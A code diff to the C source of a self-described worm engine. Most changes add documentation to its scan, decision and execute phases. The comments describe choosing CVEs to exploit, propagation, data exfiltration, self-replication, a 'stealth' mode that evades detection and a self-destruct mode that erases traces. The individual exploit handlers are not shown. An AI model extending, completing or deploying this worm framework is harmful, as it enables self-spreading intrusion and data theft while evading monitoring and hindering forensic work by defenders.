@@ -15,17 +15,41 @@
 #define REMOTE_WORM_PATH "/tmp/worm"
 #define WORM_LOG_PATH "/tmp/worm.log"
 
-// Phase 1: Scan
-// Calls all registered scan handlers
-// Each handler decides what to scan (local or remote) internally
-// target_ip parameter may be ignored by handlers that perform their own scanning
+/**
+ * Phase 1: Scan Phase
+ * Executes all registered scan handlers to discover vulnerabilities.
+ * 
+ * @param target_ip Optional target IP address. Handlers may ignore this parameter
+ *                  if they perform their own scanning logic (e.g., network discovery).
+ *                  Pass NULL to let handlers decide their scanning strategy.
+ * @return Vector of scan results containing vulnerability status for each registered CVE.
+ * 
+ * @note Each handler is responsible for determining what to scan (local system checks,
+ *       network discovery, remote host scanning, etc.). The engine does not dictate
+ *       scanning strategy - it only orchestrates handler execution.
+ */
 static cve_result_vector_t phase1_scan(const char* target_ip) {
     return scan_all_handlers(target_ip);
 }
 
-// Phase 2: Decision
-// Determines which CVE to execute based on scan results and risk assessment
-// Risk thresholds: <4 = normal, 4-6 = stealth, >=7 = self-destruct
+/**
+ * Phase 2: Decision Phase
+ * Selects the most appropriate CVE to execute based on scan results and risk assessment.
+ * 
+ * @param scan_results Vector of scan results from all handlers, indicating which CVEs
+ *                     are vulnerable and their confidence levels.
+ * @param risk Current risk assessment indicating detection signals and safety levels.
+ * @return Decision result containing the selected CVE ID and execution flag.
+ * 
+ * @note Risk-based mode selection:
+ *       - Normal mode (risk < 4): Full operations allowed
+ *       - Stealth mode (risk 4-6): Reduced activity, longer delays
+ *       - Self-destruct (risk >= 7): Immediate termination (handled by main loop)
+ * 
+ * @note The decision engine evaluates CVEs in priority order and selects the first
+ *       one that meets all criteria (vulnerability, port availability, confidence,
+ *       risk threshold, mode compatibility).
+ */
 static decision_result_t phase2_decision(cve_result_vector_t* scan_results, 
                                          risk_assessment_t* risk) {
     degradation_mode_t mode = MODE_NORMAL;
@@ -37,7 +61,19 @@ static decision_result_t phase2_decision(cve_result_vector_t* scan_results,
     return make_decision(scan_results, risk, mode);
 }
 
-// Phase 3: Execute
+/**
+ * Phase 3: Execution Phase
+ * Executes the selected CVE's execution handler.
+ * 
+ * @param cve_id The CVE ID to execute (as returned by decision phase).
+ * @param target_ip Optional target IP address. Handlers may ignore this if they use
+ *                  their own target lists (e.g., from scan phase).
+ * @param argv0 Program name (currently unused, reserved for self-replication).
+ * @return 1 on successful execution, 0 on failure.
+ * 
+ * @note Updates operation counters for risk assessment behavioral signals.
+ *       Success/failure metrics influence future risk calculations.
+ */
 static int phase3_execute(int cve_id, const char* target_ip, const char* argv0) {
     (void)argv0;
     
@@ -74,15 +110,51 @@ static int phase3_execute(int cve_id, const char* target_ip, const char* argv0) 
     }
 }
 
+/**
+ * Main Entry Point
+ * Implements the CVE-aware, safely-degrading worm's 4-phase engine.
+ * 
+ * Engine Architecture:
+ * 
+ * Phase 0: Risk Assessment
+ *   - Evaluates detection signals from network, system, and behavioral sources
+ *   - Calculates weighted risk score (0-10)
+ *   - Triggers degradation modes: normal (<4), stealth (4-6), self-destruct (>=7)
+ * 
+ * Phase 1: Scan
+ *   - Executes all registered scan handlers
+ *   - Collects vulnerability information for decision phase
+ *   - Handlers perform local/remote scanning as appropriate
+ * 
+ * Phase 2: Decision
+ *   - Evaluates scan results against decision rules in priority order
+ *   - Selects highest-priority CVE that meets all criteria
+ *   - Considers: vulnerability status, port availability, confidence, risk level, mode
+ * 
+ * Phase 3: Execute
+ *   - Runs the selected CVE's execution handler
+ *   - Updates operation counters for risk assessment
+ *   - Handlers perform exploits, propagation, data exfiltration, etc.
+ * 
+ * Safety Features:
+ *   - Risk-based degradation prevents detection in monitored environments
+ *   - Self-destruction mode cleans up traces before exit
+ *   - State management prevents duplicate infections and infinite loops
+ * 
+ * @param argc Argument count (unused).
+ * @param argv Argument vector. argv[0] contains program name.
+ * @return Always returns 0 (self-destruct exits via exit(0)).
+ * 
+ * @note All output is redirected to /tmp/worm.log for persistent logging.
+ *       Use `tail -f /tmp/worm.log` to monitor worm activity.
+ */
 int main(int argc, char* argv[]) {
     (void)argc;
     
-    // Redirect stdout and stderr to log file for persistent logging
-    // This allows us to view worm activity via: tail -f /tmp/worm.log
+    // Redirect stdout and stderr to log file
     FILE* log_file = freopen(WORM_LOG_PATH, "a", stdout);
     if (log_file == NULL) {
-        // If we can't open log file, continue without logging
-        // (this allows worm to still work even if log file can't be created)
+        // Continue without logging if file can't be opened
     }
     // Also redirect stderr to the same log file
     freopen(WORM_LOG_PATH, "a", stderr);
@@ -168,8 +240,6 @@ int main(int argc, char* argv[]) {
         printf("\n=== DECISION PHASE ===\n");
         decision_result_t decision = phase2_decision(&scan_results, &risk);
         
-        // Decision engine evaluates all registered CVEs in priority order
-        // First CVE that meets all criteria (vulnerable, port, confidence, risk, mode) is selected
         if (!decision.should_execute) {
             printf("[-] No suitable CVE selected\n");
             printf("[-] Reason: No CVE met all decision criteria (vulnerable, port, confidence, risk, mode)\n");
@@ -177,7 +247,6 @@ int main(int argc, char* argv[]) {
             printf("[+] Selected CVE ID %d for execution\n", decision.selected_cve_id);
             
             // Phase 3: Execute - run the selected CVE's execution handler
-            // Execution handler uses vulnerable hosts discovered during scan phase
             printf("\n[*] Phase 3: Execute - waiting 3 seconds...\n");
             sleep(3);
             printf("\n=== EXECUTION PHASE ===\n");
